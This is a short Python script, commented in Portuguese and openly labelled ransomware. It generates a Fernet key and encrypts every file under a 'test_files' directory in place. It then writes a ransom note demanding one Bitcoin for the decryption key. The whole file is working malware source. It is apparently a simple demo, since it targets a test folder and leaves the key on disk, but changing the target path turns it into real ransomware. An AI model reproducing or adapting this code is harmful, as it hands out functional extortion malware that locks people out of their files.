from cryptography.fernet import Fernet
import os

# 1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. Criptografar um único arquivo
def criptografar_arquivo(nome_arquivo, chave):
    f = Fernet(chave)
    with open(nome_arquivo, "rb") as file:
        arquivo_dados = file.read()
    arquivo_criptografado = f.encrypt(arquivo_dados)
    with open(nome_arquivo, "wb") as file:
        file.write(arquivo_criptografado)

# 4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    arquivos_para_criptografar = []
    for raiz, dirs, files in os.walk(diretorio):
        for nome_arquivo in files:
            caminho_arquivo = os.path.join(raiz, nome_arquivo)
            if nome_arquivo != "ransoware.py" and not caminho_arquivo.endswith(".key"):
                arquivos_para_criptografar.append(caminho_arquivo)
    return arquivos_para_criptografar

# 5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("MENSAGEM_DE_RESCATE.txt", "w") as file:
        file.write("Seus arquivos foram criptografados!\n")
        file.write("Para recuperá-los, envie 1 Bitcoin para o endereço XYZ e entre em contato com o suporte.\n")
        file.write("Após o pagamento, você receberá a chave de descriptografia.\n")

# 6. Execução do ransomware
def executar_ransomware():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado com sucesso! Seus arquivos foram criptografados.")

if __name__ == "__main__":
    executar_ransomware()